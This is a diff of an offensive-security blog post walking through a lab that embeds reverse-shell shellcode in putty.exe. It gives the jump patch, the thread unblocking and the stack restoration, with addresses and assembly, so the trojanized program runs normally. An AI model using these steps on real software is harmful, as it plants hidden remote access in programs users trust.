+<figure class="not-prose my-8 group"> <div class="relative border border-border/60 overflow-hidden"> <!-- HUD corners --> <span class="absolute top-0 left-0 w-3 h-3 border-t border-l border-primary/40 z-10"></span> <span class="absolute top-0 right-0 w-3 h-3 border-t border-r border-primary/40 z-10"></span> <span class="absolute bottom-0 left-0 w-3 h-3 border-b border-l border-primary/40 z-10"></span> <span class="absolute bottom-0 right-0 w-3 h-3 border-b border-r border-primary/40 z-10"></span> <!-- Scanline overlay --> <div class="absolute inset-0 bg-gradient-to-b from-transparent via-primary/[0.02] to-transparent pointer-events-none z-10"></div> <img src="/images/backdooring-pe-files/image-20240310154355294.png" alt="manual trigger" class="w-full h-auto hud-img transition-all duration-700" loading="lazy"> </div> <figcaption class="mt-3 font-mono text-[12px] tracking-wider text-muted-foreground/60 uppercase"> Manually setting the EIP (1), continuing execution (2), and getting a reverse shell back (3). </figcaption> </figure>
+<p>Here is the whole process in action:</p>
+<figure class="not-prose my-8 group"> <div class="relative border border-border/60 overflow-hidden"> <!-- HUD corners --> <span class="absolute top-0 left-0 w-3 h-3 border-t border-l border-primary/40 z-10"></span> <span class="absolute top-0 right-0 w-3 h-3 border-t border-r border-primary/40 z-10"></span> <span class="absolute bottom-0 left-0 w-3 h-3 border-b border-l border-primary/40 z-10"></span> <span class="absolute bottom-0 right-0 w-3 h-3 border-b border-r border-primary/40 z-10"></span> <!-- Scanline overlay --> <div class="absolute inset-0 bg-gradient-to-b from-transparent via-primary/[0.02] to-transparent pointer-events-none z-10"></div> <img src="/images/backdooring-pe-files/backdoor_pe.gif" alt="manual trigger demo" class="w-full h-auto hud-img transition-all duration-700" loading="lazy"> </div> <figcaption class="mt-3 font-mono text-[12px] tracking-wider text-muted-foreground/60 uppercase"> Demo of manually triggering the shellcode. </figcaption> </figure>
+<p>We have successfully triggered the shellcode. Now, we know that the theories are in place and we have laid the groundworks for what&#39;s coming next.</p>
+<h2 id="execution-redirection">Execution Redirection</h2>
+<p>With the help of a debugger, we were able to manually trigger our shellcode. Now, we&#39;ll attempt to patch the binary so that the shell triggers automatically and redirects execution back to <code>putty.exe</code></p>
 <p>The patching process can be a little complicated and tedious. The high level step are as follows:</p>
 <ol>
 <li>Prepend the shellcode with <code>pushad</code> and <code>pushfd</code> instructions</li>
 <li>Overwrite a 5 byte instruction in <code>putty.exe</code> with a jump to our shellcode</li>
 <li>Append the shellcode with code that will restore the stack frame and redirect execution back to <code>putty.exe</code></li>
 </ol>
-<h2 id="Prepending-our-Shellcode"><a href="#Prepending-our-Shellcode" class="headerlink" title="Prepending our Shellcode"></a>Prepending our Shellcode</h2><p>Before anything, the first modification we want to make to our shellcode is to prepend it with the <code>pushfd</code> and <code>pushad</code> instructions. These instructions will push the contents of registers right before shellcode execution onto the stack. We will want to restore these states after we execute our shellcode.</p>
+<h3 id="prepending-our-shellcode">Prepending our Shellcode</h3>
+<p>Before anything, the first modification we want to make to our shellcode is to prepend it with the <code>pushfd</code> and <code>pushad</code> instructions. These instructions will push the contents of registers right before shellcode execution onto the stack. We will want to restore these states after we execute our shellcode.</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://www.felixcloutier.com/x86/pusha:pushad">https://www.felixcloutier.com/x86/pusha:pushad</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.felixcloutier.com/x86/pushf:pushfd:pushfq">https://www.felixcloutier.com/x86/pushf:pushfd:pushfq</a></li>
+<li><a href="https://www.felixcloutier.com/x86/pusha:pushad">https://www.felixcloutier.com/x86/pusha:pushad</a></li>
+<li><a href="https://www.felixcloutier.com/x86/pushf:pushfd:pushfq">https://www.felixcloutier.com/x86/pushf:pushfd:pushfq</a></li>
 </ul>
-<p>This process is relatively easy. <code>pushad</code>‘s opcode is <code>60</code> and <code>pushfd</code>‘s opcode is <code>9C</code>. We just need to insert these right before our shellcode in <code>HxD</code>. I recommend putting <code>609C</code> before your shellcode and just pasting it as a whole into <code>HxD</code>.</p>
-<p><img src="/posts/backdooring-pe-files/image-20240310193300866.png"></p>
-<h2 id="Jumping-to-our-Shellcode"><a href="#Jumping-to-our-Shellcode" class="headerlink" title="Jumping to our Shellcode"></a>Jumping to our Shellcode</h2><p>The next step we want to do is to find a 5 byte instruction where we can overwrite with <code>jmp &lt;addr_of_shellcode&gt;</code>.</p>
-<p>Step through the execution of <code>putty.exe</code> in a debugger. We see a 5 byte instruction at <code>0073FA61</code>. We’ll take a note of this instruction and the next for later.</p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0073FA61 | E8 3A070000              | call putty.7401A0                       | (assembly: call 0x007401A0)</span><br><span class="line">0073FA66 | 6A 01                    | push 1                                  |</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/backdooring-pe-files/image-20240310193447062.png"></p>
-<p>Overwrite the instruction with a jump to our shellcode. In this case, it’s at <code>0080F000</code><br><img src="/posts/backdooring-pe-files/image-20240310193538819.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 0x0080F000</span><br></pre></td></tr></table></figure>
-
-<p>To patch, Right-click -&gt; <code>Assemble</code> and put our jump instruction in.<br><img src="/posts/backdooring-pe-files/image-20240310193615493.png"></p>
-<p><img src="/posts/backdooring-pe-files/image-20240310193630408.png"></p>
-<p><img src="/posts/backdooring-pe-files/image-20240310193644246.png"></p>
-<p>Next, we’ll attempt to add a few modifications to our shellcode to redirect the execution back to <code>putty.exe</code>.</p>
-<h2 id="Appending-our-Shellcode"><a href="#Appending-our-Shellcode" class="headerlink" title="Appending our Shellcode"></a>Appending our Shellcode</h2><p>There are several places where we need to modify our shellcode in order to have the redirection work properly. Mainly, the modifications consist of:</p>
+<p>This process is relatively easy. <code>pushad</code>&#39;s opcode is <code>60</code> and <code>pushfd</code>&#39;s opcode is <code>9C</code>. We just need to insert these right before our shellcode in <code>HxD</code>. I recommend putting <code>609C</code> before your shellcode and just pasting it as a whole into <code>HxD</code>.</p>
+<p><img src="/images/backdooring-pe-files/image-20240310193300866.png" alt/></p>
+<h3 id="jumping-to-our-shellcode">Jumping to our Shellcode</h3>
+<p>The next step we want to do is to find a 5 byte instruction where we can overwrite with <code>jmp &lt;addr_of_shellcode&gt;</code>.</p>
+<p>Step through the execution of <code>putty.exe</code> in a debugger. We see a 5 byte instruction at <code>0073FA61</code>. We&#39;ll take a note of this instruction and the next for later.</p>
+<pre class="astro-code astro-code-themes github-light-default github-dark-default" style="background-color:#ffffff;--shiki-dark-bg:#0d1117;color:#1f2328;--shiki-dark:#e6edf3;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="txt"><code><span class="line"><span>0073FA61 | E8 3A070000              | call putty.7401A0                       | (assembly: call 0x007401A0)</span></span>
+<span class="line"><span>0073FA66 | 6A 01                    | push 1                                  |</span></span></code></pre>
+<p><img src="/images/backdooring-pe-files/image-20240310193447062.png" alt/></p>
+<p>Overwrite the instruction with a jump to our shellcode. In this case, it&#39;s at <code>0080F000</code>
+<img src="/images/backdooring-pe-files/image-20240310193538819.png" alt/></p>
+<pre class="astro-code astro-code-themes github-light-default github-dark-default" style="background-color:#ffffff;--shiki-dark-bg:#0d1117;color:#1f2328;--shiki-dark:#e6edf3;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#CF222E;--shiki-dark:#FF7B72">jmp</span><span style="color:#0550AE;--shiki-dark:#79C0FF"> 0x0080F000</span></span></code></pre>
+<p>To patch, Right-click -&gt; <code>Assemble</code> and put our jump instruction in.
+<img src="/images/backdooring-pe-files/image-20240310193615493.png" alt/></p>
+<p><img src="/images/backdooring-pe-files/image-20240310193630408.png" alt/></p>
+<p><img src="/images/backdooring-pe-files/image-20240310193644246.png" alt/></p>
+<p>Next, we&#39;ll attempt to add a few modifications to our shellcode to redirect the execution back to <code>putty.exe</code>.</p>
+<h3 id="appending-our-shellcode">Appending our Shellcode</h3>
+<p>There are several places where we need to modify our shellcode in order to have the redirection work properly. Mainly, the modifications consist of:</p>
 <ul>
 <li>Unblocking the thread by patching <code>WaitForSignaledObject</code></li>
 <li>Restoring the stack frame and register states with <code>popfd</code> and <code>popad</code></li>
 <li>Restore the overwritten instruction</li>
 <li>Jump to next instruction right after overwritten instruction</li>
 </ul>
-<h3 id="Unblocking-the-Thread"><a href="#Unblocking-the-Thread" class="headerlink" title="Unblocking the Thread"></a>Unblocking the Thread</h3><p>If we ran the previous modification with the jump instruction to our shellcode, you’ll notice that although we catch the reverse shell, the <code>putty.exe</code> GUI won’t display afterwards.</p>
-<p>The reason <code>putty.exe</code> isn’t showing its GUI is because the shellcode execution is blocking the thread by calling <code>WaitForSignaledObject</code> with <code>-1 (INFINITE)</code>  as the argument - essentially blocking it forever. We want to make sure the value passed in as the argument is <code>0</code>.</p>
-<p>The instruction <code>dec esi</code> at <code>0080F11B</code> changes ESI to <code>-1</code>, which is then pushed onto the stack as an argument to <code>WaitForSignaledObject</code><br><img src="/posts/backdooring-pe-files/image-20240310201003514.png"></p>
-<p>We can attempt to NOP out the instruction, so that ESI stays <code>0</code> - telling the thread to wait for 0 seconds before unblocking.<br><img src="/posts/backdooring-pe-files/image-20240310201017372.png"></p>
-<h3 id="Restore-Stack-Frame-Execution"><a href="#Restore-Stack-Frame-Execution" class="headerlink" title="Restore Stack Frame &amp; Execution"></a>Restore Stack Frame &amp; Execution</h3><p>Now, we modify the end of the shellcode to restore our stack frame and register states to before our shellcode execution. Then, we can pass execution back to <code>putty.exe</code>.</p>
-<p>At the end of our shellcode, you’ll notice a <code>call ebp</code> instruction. This essentially closes the <code>putty.exe</code> process after our thread has executed. We will start patching from this last instruction.<br><img src="/posts/backdooring-pe-files/image-20240310205922936.png"></p>
-<p>We’ll want to replace this with an instruction that restores our ESP to before our shellcode execution, but after our <code>pushad</code> and <code>pushfd</code> instructions. To find this value, we can put a breakpoint after the <code>pushad</code> and <code>pushfd</code> instructions and note the ESP right after. In this case, it’s <code>012FFB00</code>.<br><img src="/posts/backdooring-pe-files/image-20240310205720973.png"></p>
-<p>The ESP after our shellcode execution is <code>012FF8FC</code><br><img src="/posts/backdooring-pe-files/image-20240310205825552.png"></p>
-<p>This means that the stack grew by <code>0x204</code> bytes<br><img src="/posts/backdooring-pe-files/image-20240310205852824.png"></p>
+<h4 id="unblocking-the-thread">Unblocking the Thread</h4>
+<p>If we ran the previous modification with the jump instruction to our shellcode, you&#39;ll notice that although we catch the reverse shell, the <code>putty.exe</code> GUI won&#39;t display afterwards.</p>
+<p>The reason <code>putty.exe</code> isn&#39;t showing its GUI is because the shellcode execution is blocking the thread by calling <code>WaitForSignaledObject</code> with <code>-1 (INFINITE)</code>  as the argument - essentially blocking it forever. We want to make sure the value passed in as the argument is <code>0</code>.</p>
+<p>The instruction <code>dec esi</code> at <code>0080F11B</code> changes ESI to <code>-1</code>, which is then pushed onto the stack as an argument to <code>WaitForSignaledObject</code>
+<img src="/images/backdooring-pe-files/image-20240310201003514.png" alt/></p>
+<p>We can attempt to NOP out the instruction, so that ESI stays <code>0</code> - telling the thread to wait for 0 seconds before unblocking.
+<img src="/images/backdooring-pe-files/image-20240310201017372.png" alt/></p>
+<h4 id="restore-stack-frame--execution">Restore Stack Frame &amp; Execution</h4>
+<p>Now, we modify the end of the shellcode to restore our stack frame and register states to before our shellcode execution. Then, we can pass execution back to <code>putty.exe</code>.</p>
+<p>At the end of our shellcode, you&#39;ll notice a <code>call ebp</code> instruction. This essentially closes the <code>putty.exe</code> process after our thread has executed. We will start patching from this last instruction.
+<img src="/images/backdooring-pe-files/image-20240310205922936.png" alt/></p>
+<p>We&#39;ll want to replace this with an instruction that restores our ESP to before our shellcode execution, but after our <code>pushad</code> and <code>pushfd</code> instructions. To find this value, we can put a breakpoint after the <code>pushad</code> and <code>pushfd</code> instructions and note the ESP right after. In this case, it&#39;s <code>012FFB00</code>.
+<img src="/images/backdooring-pe-files/image-20240310205720973.png" alt/></p>
+<p>The ESP after our shellcode execution is <code>012FF8FC</code>
+<img src="/images/backdooring-pe-files/image-20240310205825552.png" alt/></p>
+<p>This means that the stack grew by <code>0x204</code> bytes
+<img src="/images/backdooring-pe-files/image-20240310205852824.png" alt/></p>
 <p>From this, we will add the following instructions to our shellcode:</p>
 <ul>
 <li>Increase the ESP by <code>0x204</code> bytes to restore the stack</li>
@@ -294,351 +154,112 @@
 <li>Jump back to the instruction right after the instruction we overwrote</li>
 </ul>
 <p>In this case, we would append the following to the shellcode:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add esp, 0x204</span><br><span class="line">popfd</span><br><span class="line">popad</span><br><span class="line">call 0x007401A0</span><br><span class="line">jmp 0x0073FA66</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/backdooring-pe-files/image-20240310201108577.png"></p>
-<p>Patch the file by Right-clicking -&gt; <code>Patches</code>, select all patches, and click <code>Patch File</code><br><img src="/posts/backdooring-pe-files/image-20240310212548779.png"><br><img src="/posts/backdooring-pe-files/image-20240310212627368.png"></p>
-<p>We’ll save the file as <code>putty_patched.exe</code></p>
-<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>Now, we should have a fully patched file. Let’s test it. We should see our shellcode execute and pass execution right back to <code>putty.exe</code>. To the target, it’s as if nothing happened :D</p>
-<p><img src="/posts/backdooring-pe-files/backdoor_pe_patched.gif"></p>
-<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>We were able to successfully embed a reverse shell into a 32-bit <code>putty.exe</code> PE binary. It must be noted that this technique is extremely well signatured. Windows Defender was turned off throughout this lab - although at some points it still picked it up (can never trust when Defender is truly off…) </p>
-<p>Here’s a speedrun attempt :)</p>
-<div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"video":{"url":"/posts/backdooring-pe-files/demo.mp4"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script>
-
-<hr>
-<p>References:<br><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode">https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode</a><br><a target="_blank" rel="noopener" href="https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/">https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/</a></p>
-
-      </div>
-      
-        <div class="prev-or-next">
-          <div class="post-foot-next">
-            
-              <a href="/posts/install-ca-android/" target="_self">
-                <i class="iconfont icon-chevronleft"></i>
-                <span>Prev</span>
-              </a>
-            
-          </div>
-          <div class="post-attach">
-            <span class="post-pubtime">
-              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2025-02-24 16:12:51
-            </span>
-            
-                  <span class="post-tags">
-                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
-                    
-                    <span class="span--tag mr-8">
-                      <a href="/tags/Malware/" title="Malware">
-                        #Malware
-                      </a>
-                    </span>
-                    
-                  </span>
-              
-          </div>
-          <div class="post-foot-prev">
-            
-              <a href="/posts/process-hollowing-direct-syscalls/" target="_self">
-                <span>Next</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-    </div>
-    
-  <div id="btn-catalog" class="btn-catalog">
-    <i class="iconfont icon-catalog"></i>
-  </div>
-  <div class="post-catalog hidden" id="catalog">
-    <div class="title">Contents</div>
-    <div class="catalog-content">
-      
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Intro"><span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tools"><span class="toc-text">Tools</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Manual-Proof-of-Concept-POC"><span class="toc-text">Manual Proof-of-Concept (POC)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#msfvenom-Shellcode"><span class="toc-text">msfvenom Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Adding-a-New-PE-Section"><span class="toc-text">Adding a New PE Section</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Insert-Shellcode-into-New-Section"><span class="toc-text">Insert Shellcode into New Section</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Manually-Trigger-the-Shellcode"><span class="toc-text">Manually Trigger the Shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Execution-Redirection"><span class="toc-text">Execution Redirection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Prepending-our-Shellcode"><span class="toc-text">Prepending our Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jumping-to-our-Shellcode"><span class="toc-text">Jumping to our Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Appending-our-Shellcode"><span class="toc-text">Appending our Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unblocking-the-Thread"><span class="toc-text">Unblocking the Thread</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Restore-Stack-Frame-Execution"><span class="toc-text">Restore Stack Frame &amp; Execution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-text">Demo</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li></ol>
-      
-    </div>
-  </div>
-
-  
-<script src="/js/catalog.js"></script>
-
-
-
-
-    
-      <div class="comments-container">
-        
-
-
-
-
-
-
-
-      </div>
-    
-  </div>
-
-
-        
-<div class="footer">
-  <div class="social">
-    <ul>
-      
-        <li>
-          
-              <a title="github" target="_blank" rel="noopener" href="https://github.com/kagehayashi">
-                <i class="iconfont icon-github"></i>
-              </a>
-              
-        </li>
-        
-    </ul>
-  </div>
-  
-    
-    <div class="footer-more">
-      
-        <a target="_blank" rel="noopener" href="https://github.com/kagehayashi">Copyright © 2025 KageHayashi</a>
-        
-    </div>
-  
-    
-    <div class="footer-more">
-      
-        ▰▰▰
-        
-    </div>
-  
-  
-</div>
-
-      </div>
-
-      <div class="tools-bar">
-        <div class="back-to-top tools-bar-item hidden">
-  <a href="javascript: void(0)">
-    <i class="iconfont icon-chevronup"></i>
-  </a>
-</div>
-
-
-<script src="/js/backtotop.js"></script>
-
-
-
-        
-  <div class="search-icon tools-bar-item" id="search-icon">
-    <a href="javascript: void(0)">
-      <i class="iconfont icon-search"></i>
-    </a>
-  </div>
-
-  <div class="search-overlay hidden">
-    <div class="search-content" tabindex="0">
-      <div class="search-title">
-        <span class="search-icon-input">
-          <a href="javascript: void(0)">
-            <i class="iconfont icon-search"></i>
-          </a>
-        </span>
-        
-          <input type="text" class="search-input" id="search-input" placeholder="Search...">
-        
-        <span class="search-close-icon" id="search-close-icon">
-          <a href="javascript: void(0)">
-            <i class="iconfont icon-close"></i>
-          </a>
-        </span>
-      </div>
-      <div class="search-result" id="search-result"></div>
-    </div>
-  </div>
-
-  <script type="text/javascript">
-    var inputArea = document.querySelector("#search-input")
-    var searchOverlayArea = document.querySelector(".search-overlay")
-
-    inputArea.onclick = function() {
-      getSearchFile()
-      this.onclick = null
-    }
-
-    inputArea.onkeydown = function() {
-      if(event.keyCode == 13)
-        return false
-    }
-
-    function openOrHideSearchContent() {
-      let isHidden = searchOverlayArea.classList.contains('hidden')
-      if (isHidden) {
-        searchOverlayArea.classList.remove('hidden')
-        document.body.classList.add('hidden')
-        // inputArea.focus()
-      } else {
-        searchOverlayArea.classList.add('hidden')
-        document.body.classList.remove('hidden')
-      }
-    }
-
-    function blurSearchContent(e) {
-      if (e.target === searchOverlayArea) {
-        openOrHideSearchContent()
-      }
-    }
-
-    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
-    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
-    searchOverlayArea.addEventListener("click", blurSearchContent, false)
-
-    var searchFunc = function (path, search_id, content_id) {
-      'use strict';
-      var $input = document.getElementById(search_id);
-      var $resultContent = document.getElementById(content_id);
-      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
-      $.ajax({
-        // 0x01. load xml file
-        url: path,
-        dataType: "xml",
-        success: function (xmlResponse) {
-          // 0x02. parse xml file
-          var datas = $("entry", xmlResponse).map(function () {
-            return {
-              title: $("title", this).text(),
-              content: $("content", this).text(),
-              url: $("url", this).text()
-            };
-          }).get();
-          $resultContent.innerHTML = "";
-
-          $input.addEventListener('input', function () {
-            // 0x03. parse query to keywords list
-            var str = '<ul class=\"search-result-list\">';
-            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-            $resultContent.innerHTML = "";
-            if (this.value.trim().length <= 0) {
-              return;
-            }
-            // 0x04. perform local searching
-            datas.forEach(function (data) {
-              var isMatch = true;
-              var content_index = [];
-              if (!data.title || data.title.trim() === '') {
-                data.title = "Untitled";
-              }
-              var orig_data_title = data.title.trim();
-              var data_title = orig_data_title.toLowerCase();
-              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
-              var data_content = orig_data_content.toLowerCase();
-              var data_url = data.url;
-              var index_title = -1;
-              var index_content = -1;
-              var first_occur = -1;
-              // only match artiles with not empty contents
-              if (data_content !== '') {
-                keywords.forEach(function (keyword, i) {
-                  index_title = data_title.indexOf(keyword);
-                  index_content = data_content.indexOf(keyword);
-
-                  if (index_title < 0 && index_content < 0) {
-                    isMatch = false;
-                  } else {
-                    if (index_content < 0) {
-                      index_content = 0;
-                    }
-                    if (i == 0) {
-                      first_occur = index_content;
-                    }
-                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
-                  }
-                });
-              } else {
-                isMatch = false;
-              }
-              // 0x05. show search results
-              if (isMatch) {
-                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
-                var content = orig_data_content;
-                if (first_occur >= 0) {
-                  // cut out 100 characters
-                  var start = first_occur - 20;
-                  var end = first_occur + 80;
-
-                  if (start < 0) {
-                    start = 0;
-                  }
-
-                  if (start == 0) {
-                    end = 100;
-                  }
-
-                  if (end > content.length) {
-                    end = content.length;
-                  }
-
-                  var match_content = content.substr(start, end);
-
-                  // highlight all keywords
-                  keywords.forEach(function (keyword) {
-                    var regS = new RegExp(keyword, "gi");
-                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
-                  });
-
-                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
-                }
-                str += "</li>";
-              }
-            });
-            str += "</ul>";
-            if (str.indexOf('<li>') === -1) {
-              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
-            }
-            $resultContent.innerHTML = str;
-          });
-        },
-        error: function(xhr, status, error) {
-          $resultContent.innerHTML = ""
-          if (xhr.status === 404) {
-            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
-          } else {
-            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
-          }
-        }
-      });
-      $(document).on('click', '#search-close-icon', function() {
-        $('#search-input').val('');
-        $('#search-result').html('');
+<pre class="astro-code astro-code-themes github-light-default github-dark-default" style="background-color:#ffffff;--shiki-dark-bg:#0d1117;color:#1f2328;--shiki-dark:#e6edf3;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#CF222E;--shiki-dark:#FF7B72">add</span><span style="color:#0550AE;--shiki-dark:#79C0FF"> esp</span><span style="color:#1F2328;--shiki-dark:#E6EDF3">, </span><span style="color:#0550AE;--shiki-dark:#79C0FF">0x204</span></span>
+<span class="line"><span style="color:#CF222E;--shiki-dark:#FF7B72">popfd</span></span>
+<span class="line"><span style="color:#CF222E;--shiki-dark:#FF7B72">popad</span></span>
+<span class="line"><span style="color:#CF222E;--shiki-dark:#FF7B72">call</span><span style="color:#0550AE;--shiki-dark:#79C0FF"> 0x007401A0</span></span>
+<span class="line"><span style="color:#CF222E;--shiki-dark:#FF7B72">jmp</span><span style="color:#0550AE;--shiki-dark:#79C0FF"> 0x0073FA66</span></span></code></pre>
+<p><img src="/images/backdooring-pe-files/image-20240310201108577.png" alt/></p>
+<p>Patch the file by Right-clicking -&gt; <code>Patches</code>, select all patches, and click <code>Patch File</code>
+<img src="/images/backdooring-pe-files/image-20240310212548779.png" alt/>
+<img src="/images/backdooring-pe-files/image-20240310212627368.png" alt/></p>
+<p>We&#39;ll save the file as <code>putty_patched.exe</code></p>
+<h3 id="demo">Demo</h3>
+<p>Now, we should have a fully patched file. Let&#39;s test it. We should see our shellcode execute and pass execution right back to <code>putty.exe</code>. To the target, it&#39;s as if nothing happened :D</p>
+<p><img src="/images/backdooring-pe-files/backdoor_pe_patched.gif" alt/></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>We were able to successfully embed a reverse shell into a 32-bit <code>putty.exe</code> PE binary. It must be noted that this technique is extremely well signatured. Windows Defender was turned off throughout this lab - although at some points it still picked it up (can never trust when Defender is truly off...)</p>
+<p>Here&#39;s a speedrun attempt :)</p>
+<figure class="not-prose my-8"> <div class="relative border border-border/60 overflow-hidden"> <!-- HUD corners --> <span class="absolute top-0 left-0 w-3 h-3 border-t border-l border-primary/40 z-10"></span> <span class="absolute top-0 right-0 w-3 h-3 border-t border-r border-primary/40 z-10"></span> <span class="absolute bottom-0 left-0 w-3 h-3 border-b border-l border-primary/40 z-10"></span> <span class="absolute bottom-0 right-0 w-3 h-3 border-b border-r border-primary/40 z-10"></span> <div id="dp--images-backdooring-pe-files-demo-mp4" data-video-src="/images/backdooring-pe-files/demo.mp4" data-video-poster data-video-type="auto"></div> </div> <figcaption class="mt-3 font-mono text-[12px] tracking-wider text-muted-foreground/60 uppercase"> Fig 01 — Demo </figcaption> </figure> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/dplayer/dist/DPlayer.min.css"> <script src="https://cdn.jsdelivr.net/npm/dplayer/dist/DPlayer.min.js"></script> <script>
+  (function () {
+    function initPlayers() {
+      document.querySelectorAll('[id^="dp-"]').forEach(function (el) {
+        if (el.dataset.dpInit) return;
+        var src = el.dataset.videoSrc;
+        if (!src) return;
+        el.dataset.dpInit = "true";
+        new DPlayer({
+          container: el,
+          video: {
+            url: src,
+            pic: el.dataset.videoPoster || "",
+            type: el.dataset.videoType || "auto",
+          },
+        });
       });
     }
 
-    var getSearchFile = function() {
-        var path = "/search.xml";
-        searchFunc(path, 'search-input', 'search-result');
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", initPlayers);
+    } else {
+      initPlayers();
     }
-  </script>
+    document.addEventListener("astro:after-swap", initPlayers);
+  })();
+</script>
+<section data-footnotes class="footnotes"><h2 class="sr-only" id="footnote-label">Footnotes</h2>
+<ol>
+<li id="user-content-fn-1">
+<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode">https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode</a> <a href="#user-content-fnref-1" data-footnote-backref aria-label="Back to reference 1" class="data-footnote-backref">↩</a></p>
+</li>
+<li id="user-content-fn-2">
+<p>CFF Explorer: <a href="https://ntcore.com/explorer-suite">https://ntcore.com/explorer-suite</a> <a href="#user-content-fnref-2" data-footnote-backref aria-label="Back to reference 2" class="data-footnote-backref">↩</a></p>
+</li>
+<li id="user-content-fn-3">
+<p>HxD: <a href="https://mh-nexus.de/en/hxd">https://mh-nexus.de/en/hxd</a> <a href="#user-content-fnref-3" data-footnote-backref aria-label="Back to reference 3" class="data-footnote-backref">↩</a></p>
+</li>
+<li id="user-content-fn-4">
+<p>x64dbg/x32dbg: <a href="https://x64dbg.com">https://x64dbg.com</a> <a href="#user-content-fnref-4" data-footnote-backref aria-label="Back to reference 4" class="data-footnote-backref">↩</a></p>
+</li>
+</ol>
+</section> <!-- Post footer tags --> <div class="mt-12 pt-6 border-t border-border not-prose"> <span class="font-mono text-[9px] tracking-[0.4em] text-muted-foreground/50 uppercase mb-3 block">
+▸ tagged
+</span> <div class="flex flex-wrap gap-2 "> <a href="/tags/malware" class="font-mono text-[9px] tracking-[0.2em] text-muted-foreground/60 hover:text-primary uppercase transition-colors border border-border/40 hover:border-foreground/30 px-2 py-1">
+#malware </a><a href="/tags/windows" class="font-mono text-[9px] tracking-[0.2em] text-muted-foreground/60 hover:text-primary uppercase transition-colors border border-border/40 hover:border-foreground/30 px-2 py-1">
+#windows </a><a href="/tags/c++" class="font-mono text-[9px] tracking-[0.2em] text-muted-foreground/60 hover:text-primary uppercase transition-colors border border-border/40 hover:border-foreground/30 px-2 py-1">
+#c++ </a> </div> </div> <div class="not-prose"> <nav class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-12"><a href="/posts/process-hollowing-direct-syscalls" class="group border border-border p-4 hover:border-foreground/30 transition-colors"><span class="font-mono text-[9px] tracking-[0.3em] text-muted-foreground/50 uppercase block mb-2">
+&larr; prev_entry
